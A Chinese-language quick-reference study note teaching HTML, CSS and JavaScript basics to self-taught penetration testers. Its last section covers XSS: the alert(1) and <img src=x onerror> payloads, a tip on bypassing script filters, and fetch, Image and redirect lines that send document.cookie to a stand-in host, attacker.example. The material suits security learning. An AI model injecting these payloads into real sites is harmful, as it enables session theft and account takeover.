**解析**　🔒 对自学渗透的你，有一条重要认知：**CSS 和 Web 安全基本无关**。它只负责「长什么样」，不处理输入输出、不碰数据库，所以不存在 SQL 注入、命令注入这类问题。极罕见的「CSS 注入」只在特定场景（用户输入被原样塞进 `<style>` 或 style 属性里）才可能被用来读数据，实战中极少遇到，初学阶段可以完全不管。那为什么还要学它？因为**看懂页面结构才能高效找注入点**：知道哪个参数、哪个元素对应哪块功能，你才知道从哪下手，也才能用 F12 定位元素、看表单怎么提交、接口怎么调。

**操作**

```text
渗透视角的真实用途：
  1. 用 F12 看表单 <form> 的 action / method  → 请求发去哪、用 GET 还是 POST
  2. 看输入框的 name 属性                     → 参数名到底叫什么
  3. 用选择器在 Elements 面板定位元素          → 快速找到可注入的位置
  4. 读页面里的链接和接口路径                  → 发现更多攻击面

结论：CSS 本身不产生常见漏洞；「CSS 注入」是极冷门场景，别被名字吓到。
```

> ⚠️ 坑：别把时间花在「找 CSS 漏洞」上；把 CSS 当成「看懂页面、定位元素」的辅助工具，主要精力放在 URL 参数、表单和请求头上。


## JS 一 引入与运行

### `<script>` 内联脚本

**解析**　JavaScript 要跑在网页里，最直接的办法就是把代码用 `<script>` 标签包起来写在 HTML 里。浏览器读到这个标签就立即执行里面的代码。适合写一小段、和这个页面强绑定的逻辑。

**操作**

```html
<!DOCTYPE html>
<html>
<body>
  <h1>我的页面</h1>
  <script>
    console.log("我是内联脚本");   // 打开 F12 控制台能看到这行
    alert("页面加载到这里了");     // 弹出的对话框
  </script>
</body>
</html>
```

> ⚠️ 坑　把 `<script>` 放在 `<body>` 底部再操作页面元素，否则元素还没解析出来，`getElementById` 会拿到 `null`。

### `<script src>` 引入外部文件

**解析**　代码多了就拆成单独的 `.js` 文件，用 `<script src="...">` 引进来，一个文件能被多个页面复用。写了 `src` 之后，标签之间原本的代码会被忽略。

**操作**

hello.js：

```javascript
console.log("来自外部文件 hello.js");
```

HTML 里引用它：

```html
<script src="hello.js"></script>
<!-- 一般放在 </body> 前面，保证上面的元素已经解析好 -->
```

> ⚠️ 坑　`src` 路径写错，浏览器只在控制台报一个 404，页面本身不会崩，很容易看不出来。

### `console.log()` 控制台输出

**解析**　把值打印到开发者工具的控制台（F12 → Console），是调试最常用的手段，可以一次打印多个值。渗透时也常用来确认「我注入的代码到底执行了没有」。

**操作**

```javascript
console.log("hello");      // hello
console.log(1 + 2);        // 3
console.log("1" + 2);      // 12   字符串 + 数字 → 转成字符串拼接
console.log([1, 2, 3]);    // [ 1, 2, 3 ]
console.log("a", "b");     // a b   逗号分隔会并排打印
```

> ⚠️ 坑　在控制台里点开打印出的对象，看到的是它**最新**的值，不一定是打印那一刻的值。

### `alert()` 弹出对话框

**解析**　弹出一个浏览器对话框显示内容，用户不点「确定」后面的代码就不继续。它是最朴素的调试方式，也是 XSS 验证里最常见的「弹头」。

**操作**

```javascript
alert("你好");              // 弹出带「你好」的对话框
alert(1 + 1);              // 弹出 2
alert(document.cookie);    // 弹出当前页面的 cookie（XSS 常见演示）
```

> ⚠️ 坑　`alert` 会阻塞页面，正式代码里别用；渗透测试里它是用来「证明代码真的执行了」的。

## JS 二 变量与类型

### `let` 可修改的变量

**解析**　声明一个可以重新赋值的变量，现代 JS 里默认就用它。声明时先不给值也行，此时它的值是 `undefined`。

**操作**

```javascript
let age = 18;
age = 19;              // 可以改
console.log(age);      // 19

let name;              // 只声明不赋值
console.log(name);     // undefined
```

> ⚠️ 坑　同一个作用域里不能重复 `let` 同名变量：`let x = 1; let x = 2;` 会直接报 `SyntaxError`。

### `const` 常量，不能改

**解析**　声明一个绑定后不能再重新赋值的变量，适合放配置、固定的引用。用 `const` 声明对象或数组时，里面的内容还能改，只是不能把整个变量换成别的值。

**操作**

```javascript
const PI = 3.14;
console.log(PI);        // 3.14
// PI = 3;              // ❌ TypeError: Assignment to constant variable.

const arr = [1, 2];
arr.push(3);            // 内容可以改
console.log(arr);       // [ 1, 2, 3 ]
// arr = [];            // ❌ 不能换掉整个数组
```

> ⚠️ 坑　`const` 锁的是「变量指向谁」，不是「对象内容不变」，别以为用了 `const` 就改不动了。

### `var` 老式变量

**解析**　`let`/`const` 出现之前的老写法。它是函数作用域、允许重复声明、有变量提升，容易出 bug。看旧代码或别人写的 XSS payload 时会遇到，自己写新代码用 `let`/`const` 就行。

**操作**

```javascript
var x = 1;
var x = 2;             // 允许重复声明，不报错
console.log(x);        // 2

console.log(y);        // undefined   变量提升：声明被提到最前面
var y = 5;
```

> ⚠️ 坑　`var` 没有块级作用域，`for (var i...)` 里的 `i` 在循环外还能访问；`let` 就不会。

### `typeof` 查看数据类型

**解析**　返回一个字符串，告诉你这个值是什么类型，是排查「为什么这里报错」的第一工具。

**操作**

```javascript
console.log(typeof "hi");        // string
console.log(typeof 42);          // number
console.log(typeof true);        // boolean
console.log(typeof undefined);   // undefined
console.log(typeof null);        // object    ← 历史遗留 bug，记住就行
console.log(typeof []);          // object    数组也是对象
console.log(typeof {});          // object
console.log(typeof (() => {}));  // function
```

> ⚠️ 坑　判断数组要用 `Array.isArray(arr)`，`typeof` 只会告诉你 `object`。

### `string` 字符串

**解析**　文本类型。用单引号、双引号或反引号包起来；反引号是模板字符串，能直接插入变量、写多行。

**操作**

```javascript
let s = "hello";
let t = 'world';
let u = `你好 ${s}`;            // 模板字符串，${} 里放变量
console.log(u);                // 你好 hello
console.log(s.length);         // 5
console.log(s.toUpperCase());  // HELLO
console.log(s + " " + t);      // hello world
```

### `number` 数字

**解析**　JS 只有一种数字类型，整数和小数都是 `number`（内部是 64 位浮点）。加减乘除、取余、幂都直接写。

**操作**

```javascript
console.log(1 + 2);            // 3
console.log(10 / 3);           // 3.3333333333333335
console.log(0.1 + 0.2);        // 0.30000000000000004   ← 浮点精度坑
console.log(7 % 3);            // 1      取余
console.log(2 ** 3);           // 8      幂
console.log(parseInt("42px")); // 42
console.log(Number("42"));     // 42
console.log(1 / 0);            // Infinity
```

> ⚠️ 坑　`0.1 + 0.2 !== 0.3`；要比较小数得用 `Math.abs(a - b) < 1e-9`。

### `boolean` 布尔值

**解析**　只有 `true` 和 `false`。比较运算、逻辑运算的结果都是布尔值，`if`、`while` 的条件也最终会转成布尔值。

**操作**

```javascript
console.log(1 < 2);        // true
console.log("a" === "b");  // false
console.log(Boolean(0));   // false
console.log(Boolean(""));  // false
console.log(Boolean("0")); // true   ← 非空字符串一律为 true
```

> ⚠️ 坑　「假值」只有 6 个：`false`、`0`、`""`、`null`、`undefined`、`NaN`，其余都是真值（`"0"`、`[]`、`{}` 都算真）。

### `null` 与 `undefined`

**解析**　都表示「没有值」。`undefined` 是「还没赋值」的默认状态；`null` 是人为表示「这里是空的」。松比较 `==` 认为两者相等。

**操作**

```javascript
let a;                 // 只声明
let b = null;          // 人为置空
console.log(a);        // undefined
console.log(b);        // null
console.log(a == b);   // true    松比较把它们看成相等
console.log(a === b);  // false   类型不同，严格比较不相等
```

> ⚠️ 坑　读一个不存在的对象属性会得到 `undefined`，再对 `undefined` 取属性就报 `TypeError: Cannot read properties of undefined`。

### `array` 数组

**解析**　有序列表，用中括号写，下标从 0 开始，长度用 `.length`，可以塞任意类型的值。

**操作**

```javascript
let arr = [1, 2, 3];
console.log(arr[0]);       // 1
console.log(arr.length);   // 3
console.log(arr[99]);      // undefined   越界不报错，返回 undefined
arr.push(4);
console.log(arr);          // [ 1, 2, 3, 4 ]
```

### `object` 对象

**解析**　键值对集合，用大括号写。用「点」访问属性，也可以用中括号加字符串。属性可以随时新增。

**操作**

```javascript
let user = { name: "Tom", age: 18 };
console.log(user.name);      // Tom
console.log(user["age"]);    // 18      中括号里是字符串
user.city = "北京";          // 直接加新属性
console.log(user);           // { name: 'Tom', age: 18, city: '北京' }
```

> ⚠️ 坑　`user.name` 和 `user["name"]` 等价；但键名是变量或含特殊字符时**只能**用中括号，如 `user[key]`。

## JS 三 运算符与条件

### `算术运算符` 加减乘除取余

**解析**　`+` 加法（也是字符串拼接）、`-` 减、`*` 乘、`/` 除、`%` 取余、`**` 幂。除了 `+`，其他运算符都会把两边先转成数字再算。

**操作**

```javascript
console.log(7 + 3);    // 10
console.log(7 - 3);    // 4
console.log(7 * 3);    // 21
console.log(7 / 2);    // 3.5
console.log(7 % 2);    // 1     取余
console.log(2 ** 3);   // 8     幂
console.log("1" + 2);  // 12    只要有一边是字符串，+ 就是拼接
```

> ⚠️ 坑　`"1" + 2` 得到 `"12"` 不是 `3`；用户输入的东西默认都是字符串，先 `Number()` 再算。

### `a===b` 严格相等判断

**解析**　`===` 要求值和类型都一样才为 `true`；`==` 会先偷偷转换类型再比较，很容易踩坑。写代码一律用 `===`。

**操作**

```javascript
console.log(1 === 1);              // true
console.log(1 == "1");             // true   松比较先转类型
console.log(1 === "1");            // false  类型不同
console.log(0 == false);           // true
console.log(null === undefined);   // false
```

> ⚠️ 坑　`==` 的隐式转换很绕（`[] == false` 也是 `true`），所以只用 `===` 和 `!==`。

### `a&&b` 逻辑与或非

**解析**　`&&`（与）、`||`（或）、`!`（非）。`&&`/`||` 会「短路」并返回参与运算的**原始值**，常用来给默认值或做条件判断。

**操作**

```javascript
console.log(true && false);   // false
console.log(true || false);   // true
console.log(!true);           // false
console.log(1 && "ok");       // ok     左边真 → 返回右边
console.log(0 || "默认");     // 默认    左边假 → 返回右边
console.log(1 < 2 && 3 > 1);  // true
```

> ⚠️ 坑　`&&`/`||` 返回的是**值**不是布尔，`0 || "默认"` 得到的是字符串 `"默认"`；需要真布尔就套一层 `Boolean(...)`。

### `if` 与 `else` 条件分支

**解析**　按条件选一条路走。条件为真执行 `if` 块，否则往下看 `else if`，全都不满足就执行 `else`。

**操作**

```javascript
let score = 85;
if (score >= 90) {
  console.log("优秀");
} else if (score >= 60) {
  console.log("及格");
} else {
  console.log("不及格");
}
// 及格
```

> ⚠️ 坑　条件里写赋值（`if (x = 1)`）不报错、永远为真；要比较就写 `if (x === 1)`。

## JS 四 循环

### `for` 计数循环

**解析**　最常用的循环：初始化 → 判断条件 → 执行循环体 → 步进，四步反复。`break` 立刻跳出整个循环，`continue` 跳过本轮进入下一轮。

**操作**

```javascript
for (let i = 0; i < 3; i++) {
  console.log(i);          // 0  1  2
}

let arr = ["a", "b", "c"];
for (let i = 0; i < arr.length; i++) {
  console.log(arr[i]);     // a  b  c
}

for (let i = 0; i < 5; i++) {
  if (i === 2) continue;   // 跳过 2
  if (i === 4) break;      // 到 4 就停
  console.log(i);          // 0  1  3
}
```

### `while` 条件循环

**解析**　只要条件为真就一直循环。循环次数不确定、由条件决定时用它；条件一开始就为假，则一次都不执行。

**操作**

```javascript
let i = 0;
while (i < 3) {
  console.log(i);   // 0  1  2
  i++;              // 别忘了改条件，否则死循环
}
```

> ⚠️ 坑　忘记 `i++` 会死循环把浏览器卡死；`do...while` 会先执行一次再判断条件。

### `for...of` 与 `for...in` 遍历

**解析**　`for...of` 遍历数组（或字符串）里的**值**，是遍历数组最舒服的写法；`for...in` 遍历对象的**键名**。别拿 `for...in` 遍历数组，它给的是字符串下标。

**操作**

```javascript
for (const v of ["a", "b", "c"]) {
  console.log(v);              // a  b  c
}

for (const k in { x: 1, y: 2 }) {
  console.log(k);              // x  y
}
```

> ⚠️ 坑　`for...in` 会连原型链上的可枚举属性一起遍历；遍历数组时下标是字符串，`i + 1` 会变成字符串拼接。

## JS 五 函数

### `function` 普通函数

**解析**　把一段逻辑打包给个名字，之后用「名字(参数)」反复调用。`return` 把结果交回调用处，没写 `return` 就返回 `undefined`。参数可以给默认值。

**操作**

```javascript
function add(a, b) {
  return a + b;
}
console.log(add(1, 2));   // 3
console.log(add(1));      // NaN   少传的参数是 undefined

function greet(name = "同学") {   // 默认值
  return "你好，" + name;
}
console.log(greet());            // 你好，同学
```

> ⚠️ 坑　少传参数不报错，值是 `undefined`，参与运算就得到 `NaN`；想让 `add(1)` 得到 1，得写默认值 `b = 0`。

### `箭头函数` 简写函数

**解析**　一种更短的函数写法 `(参数) => 返回值`。只有一个参数可省括号，函数体只有一句时可省 `return` 和花括号。它没有自己的 `this`，常在做 `.map()`、事件回调时用。

**操作**

```javascript
const add = (a, b) => a + b;
console.log(add(1, 2));          // 3

const square = n => n * n;       // 单参数省括号
console.log(square(5));          // 25

const logIt = () => { console.log("hi"); };  // 多条语句要花括号
logIt();                         // hi
```

> ⚠️ 坑　箭头函数没有自己的 `this`，会借用外层的；需要 `this` 指回元素本身（比如 `el.onclick = function () {...}` 里用 `this`）时要用普通 `function`。

## JS 六 数组与对象方法

### `push` 与 `pop` 增删数组

**解析**　在数组两头增删元素：`push` 末尾加、`pop` 末尾删、`shift` 开头删、`unshift` 开头加。`push` 返回新长度，`pop`/`shift` 返回被删掉的元素。

**操作**

```javascript
let a = [1, 2];
console.log(a.push(3));   // 3        返回新长度
console.log(a);           // [ 1, 2, 3 ]
console.log(a.pop());     // 3        删掉并返回末尾元素
console.log(a);           // [ 1, 2 ]
console.log(a.shift());   // 1        删掉并返回开头元素
a.unshift(0);             // 开头插入 0
console.log(a);           // [ 0, 2 ]
```

### `forEach` 遍历数组

**解析**　对每个元素执行一次回调函数，回调参数是 `(元素, 下标)`。只用来「对每个元素做点什么」，不返回新数组。

**操作**

```javascript
[10, 20, 30].forEach((v, i) => {
  console.log(i, v);     // 0 10   /   1 20   /   2 30
});
```

> ⚠️ 坑　`forEach` 里写 `return` 不会中断循环，只是结束这一次回调；想中途跳出用 `for...of` + `break`。

### `map` 映射成新数组

**解析**　把每个元素经过回调处理，返回一个**新数组**，长度不变，原数组不动。转换数据时最常用。

**操作**

```javascript
let nums = [1, 2, 3];
let doubled = nums.map(n => n * 2);
console.log(doubled);    // [ 2, 4, 6 ]
console.log(nums);       // [ 1, 2, 3 ]   原数组不变
```

### `filter` 按条件筛选

**解析**　回调返回 `true` 的元素留下、返回 `false` 的丢掉，返回一个**新数组**，原数组不动。

**操作**

```javascript
let nums = [1, 2, 3, 4];
let even = nums.filter(n => n % 2 === 0);
console.log(even);       // [ 2, 4 ]
```

### `join` 与 `split` 数组字符串互转

**解析**　`join` 把数组拼成一个字符串（默认逗号，可指定分隔符）；`split` 把字符串按分隔符切成数组。两者互为反向操作。

**操作**

```javascript
console.log([1, 2, 3].join("-"));    // 1-2-3
console.log([1, 2, 3].join(""));     // 123
console.log("a,b,c".split(","));     // [ 'a', 'b', 'c' ]
```

### `Object.keys` 与 `JSON` 对象工具

**解析**　`Object.keys`/`Object.values` 拿到对象所有键名/值的数组。`JSON.stringify` 把对象转成 JSON 字符串，`JSON.parse` 反过来。前后端传数据、XSS 里拼 payload 都用得上。

**操作**

```javascript
let user = { name: "Tom", age: 18 };
console.log(Object.keys(user));      // [ 'name', 'age' ]
console.log(Object.values(user));    // [ 'Tom', 18 ]

let s = JSON.stringify(user);
console.log(s);                      // {"name":"Tom","age":18}
console.log(JSON.parse(s).name);     // Tom
```

## JS 七 DOM 操作

### `document.getElementById` 按 id 取元素

**解析**　`document` 代表整个页面，用它按 `id` 拿到页面上的某个元素，之后才能改它的内容或绑定事件。找不到就返回 `null`。

**操作**

```html
<p id="msg">原来的文字</p>
<script>
  const el = document.getElementById("msg");
  console.log(el.innerText);        // 原来的文字
  el.innerText = "被 JS 改了";       // 改掉页面上的文字
</script>
```

> ⚠️ 坑　脚本跑在元素之前时会拿到 `null`，再对 `null` 取属性就报错；把 `<script>` 放到元素后面，或放进 `window.onload`。

### `document.querySelector` 按选择器取元素

**解析**　用 CSS 选择器语法找元素，比 `getElementById` 通用：`#id`、`.class`、`div > p` 都行。`querySelector` 返回**第一个**匹配的，`querySelectorAll` 返回**全部**（类数组，用 `length` 和下标访问）。

**操作**

```html
<p class="item">A</p>
<p class="item">B</p>
<script>
  const one = document.querySelector(".item");       // 第一个 .item
  const all = document.querySelectorAll(".item");    // 全部
  console.log(one.innerText);      // A
  console.log(all.length);         // 2
  console.log(all[1].innerText);   // B
</script>
```

### `innerHTML` 读写元素内的 HTML

**解析**　读取或设置元素内部的 HTML 源码。**设置**时会把字符串当 HTML 解析，标签会生效——这既是方便之处，也是 XSS 最常见的入口。

**操作**

```html
<div id="box"></div>
<script>
  const box = document.getElementById("box");
  box.innerHTML = "<b>加粗</b> 和 <a href='#'>链接</a>";   // 标签被当 HTML 解析
  console.log(box.innerHTML);   // <b>加粗</b> 和 <a href="#">链接</a>
</script>
```

> ⚠️ 坑　把用户输入直接塞进 `innerHTML` 就是 XSS：`innerHTML = "<img src=x onerror=alert(1)>"` 会执行脚本。只显示纯文字请改用 `textContent`。

### `innerText` 与 `textContent` 读写纯文字

**解析**　只处理纯文本，**不解析标签**，所以用它写用户输入是安全的。`textContent` 会连隐藏元素的文字也取到；`innerText` 只取「看上去能看到」的文字，更贴近视觉。

**操作**

```html
<div id="box"><b>加粗</b> 文字</div>
<script>
  const box = document.getElementById("box");
  console.log(box.textContent);          // 加粗 文字
  box.textContent = "<b>不会加粗</b>";    // 原样显示成文字，不解析
</script>
```

> ⚠️ 坑　想「安全地显示用户内容」就用 `textContent`；`innerHTML` 会把内容当代码解析。

### `document.createElement` 创建新元素

**解析**　在内存里造一个新元素，设置好内容和属性后，用 `appendChild`（或 `append`）挂到页面上才可见。

**操作**

```html
<ul id="list"></ul>
<script>
  const li = document.createElement("li");
  li.textContent = "新条目";
  document.getElementById("list").appendChild(li);
  // 页面上多出一个 <li>新条目</li>
</script>
```

> ⚠️ 坑　只 `createElement` 不 `appendChild`，元素不会出现在页面上。

## JS 八 事件

### `onclick` 点击时触发

**解析**　点击元素时执行的代码。可以写在 HTML 属性里（`onclick="..."`），也可以用 JS 给元素的 `onclick` 赋值一个函数。这是「让页面动起来」最基本的事件。

**操作**

```html
<button id="btn">点我</button>
<script>
  document.getElementById("btn").onclick = function () {
    alert("被点了");
  };
</script>
```

> ⚠️ 坑　用 JS 赋值时写 `el.onclick = fn`（函数名，不带括号）；写成 `fn()` 会在绑定时立刻执行，反而没绑上。

### `onload` 加载完成时触发

**解析**　`window.onload` 在页面所有资源（图片、脚本）加载完后执行；`<img onload="...">` 在图片成功加载后触发。常用来保证「元素都出来了」再操作 DOM。

**操作**

```html
<script>
  window.onload = function () {
    console.log("页面和图片都加载完了");
    document.getElementById("msg").innerText = "可以安全操作 DOM 了";
  };
</script>
<p id="msg">加载中…</p>
```

> ⚠️ 坑　一个 `window.onload` 只能挂一个，后挂的会覆盖前面的；要挂多个用 `addEventListener("load", ...)`。

### `onerror` 出错时触发🔒

**解析**　资源加载失败或脚本运行出错时触发的回调。`<img onerror="...">` 在图片加载失败时执行里面的代码，`window.onerror` 则捕获脚本的运行时错误。**安全用途**：它是 XSS 的常用载体——`src` 写一个坏地址，图片加载失败就自动触发，不需要用户点任何东西。

**操作**

```html
<img src="不存在的图片.png" onerror="console.log('图片加载失败，触发 onerror')">
<script>
  window.onerror = function (msg) {
    console.log("页面出错了：", msg);
  };
</script>
```

> ⚠️ 坑　`onerror` 触发**不需要用户点击**，所以 `<img src=x onerror=...>` 是「自动执行」的 XSS 弹头。

### `onmouseover` 与 `onfocus` 鼠标移入与聚焦

**解析**　`onmouseover` 鼠标移到元素上时触发；`onfocus` 元素获得焦点（点进输入框、Tab 切到它）时触发。常用来做交互反馈或触发隐藏逻辑。

**操作**

```html
<div onmouseover="this.style.color='red'">鼠标移上来变红</div>
<input onfocus="this.style.background='yellow'" placeholder="点我聚焦">
```

> ⚠️ 坑　鼠标在一个元素内部移动也会反复触发 `onmouseover`；性能敏感场景用 `onmouseenter`。

### `addEventListener` 绑定事件监听

**解析**　给元素绑定事件的「现代写法」：`addEventListener("事件名", 处理函数)`。和 `onclick = ...` 相比，它不会互相覆盖，可以给同一个元素绑多个处理函数。

**操作**

```javascript
const btn = document.getElementById("btn");
btn.addEventListener("click", () => console.log("第一次点击"));
btn.addEventListener("click", () => console.log("第二次点击"));
// 两个都会执行；用 btn.onclick = ... 的方式则只会保留最后一个
```

## JS 九 浏览器对象与 XSS

### `document.cookie` 读写 cookie🔒

**解析**　读写当前页面能访问到的 cookie（键值对）。写的时候一次只能写一个；读的时候返回一整个字符串，需要用 `;` 自己拆。**安全用途**：XSS 成功后，攻击者用它能拿到用户的会话 cookie 去冒充用户登录——所以偷 cookie 是 XSS 的主要目标之一。

**操作**

```javascript
document.cookie = "username=Tom";       // 写一个
console.log(document.cookie);
// "username=Tom; sessionid=abc123"     读到的是一整串，用 ; 拆
```

> ⚠️ 坑　带 `HttpOnly` 的 cookie 用 `document.cookie` **读不到**（这正是服务端防 XSS 偷 cookie 的关键设置）；能读到的只是没设 HttpOnly 的那些。

### `location` 当前网址与跳转

**解析**　`location` 是当前页面的 URL 信息：`href` 完整地址、`search` 查询串（`?` 之后）、`hash` 锚点（`#` 之后）。给 `location.href` 赋值就能跳转。

**操作**

```javascript
console.log(location.href);      // "https://site.com/page?id=1#top"
console.log(location.search);    // "?id=1"
console.log(location.hash);      // "#top"
// location.href = "https://example.com";   // 整个页面跳过去
```

> ⚠️ 坑　`location.href = 用户可控的字符串` 能跳去钓鱼站（开放重定向）；XSS 里也常用它把用户弹走。

### `window` 浏览器全局对象

**解析**　`window` 是浏览器里最顶层的全局对象，`alert`、`location`、`document` 都是它的属性。在全局作用域用 `var` 声明的变量其实就是挂在 `window` 上。

**操作**

```javascript
console.log(window.location === location);   // true
console.log(window.innerWidth);              // 窗口宽度，如 1280
window.alert("全局对象");

var a = 1;
console.log(window.a);                       // 1   var 声明的变量挂到 window 上
```

> ⚠️ 坑　`let`/`const` 声明的全局变量**不会**挂到 `window` 上，只有 `var` 会。

### `alert(1)` 最小 XSS 弹头🔒

**解析**　XSS（跨站脚本）的核心就是「让别人的浏览器执行你写的 JS」。证明漏洞存在的最少证据，就是让页面弹出一个 `1`——`alert(1)`。**安全用途**：渗透测试里先用它确认「输入真的被当成代码执行了」，再换成更危险的操作。

**操作**

```javascript
alert(1)
```

> ⚠️ 坑　`alert` 很显眼，实战验证常用 `console.log(1)` 代替；但报告里最常见的 PoC 仍然是 `alert(1)`。

### `<img src=x onerror=...>` 无交互触发🔒

**解析**　不用用户点击就能执行代码的经典 payload。`src=x` 是个坏地址，浏览器加载图片失败，于是自动触发 `onerror`，里面的代码就被执行了。**安全用途**：往 `innerHTML` 或任何可注入 HTML 的地方塞这个标签，页面一渲染就弹窗，验证存储型/反射型 XSS 最常用。

**操作**

```html
<img src=x onerror="alert(1)">
<!-- src=x 加载失败 → 自动执行 onerror → 弹窗 1，无需任何点击 -->
```

> ⚠️ 坑　有些站点会过滤 `<script>`，但「事件属性」形式的 payload 往往能绕过，所以它是绕过 filter 的常用套路。

### `fetch` 与 `new Image()` 外发 cookie🔒

**解析**　拿到 cookie 后要把它送出去，靠的是「发起一个请求」。`fetch` 能发 GET/POST，`new Image().src = ...` 则偷偷发一个图片 GET 请求、最不起眼。**安全用途**：XSS 里把 `document.cookie` 拼进 URL 请求攻击者的服务器，对方的访问日志里就记下了这个 cookie。

**操作**

```javascript
// 方式一：fetch —— 可以 POST，能带走更多数据
fetch("https://attacker.example/steal?c=" + encodeURIComponent(document.cookie));

// 方式二：Image —— 一个 GET 请求，不关心返回，最隐蔽
new Image().src = "https://attacker.example/steal?c=" + encodeURIComponent(document.cookie);

// 方式三：直接跳转（会把用户也一起带走，比较粗暴）
// location.href = "https://attacker.example/steal?c=" + document.cookie;
```

> ⚠️ 坑　跨站请求默认**不带**目标站点的 cookie，但这里偷的是「当前页面」的 cookie 并把它拼进 URL 发出去，跟带不带 cookie 无关，所以照样得手。


## 学习建议

- 顺序建议：先把第一、二部分过一遍（HTML → CSS），随手写一个小页面（标题 + 段落 + 图片 + 列表）；再学第三部分 JavaScript，给这个页面加上「点按钮改文字」这类交互。三部分看完，你就有能力从零搭一个静态网页了。
- 卡住时优先回来查索引，而不是从头翻：这份笔记是「忘了我来查」，不是「从头读到尾」的教材。
- 下一步：学完这份，可以接着看《URL 速查笔记》补「网址与请求怎么构造」，或直接上手搭一个自己的页面练手——**HTML 管有什么、CSS 管长什么样、JS 管会动什么**，这三句想清楚，任何布局都能拆解。
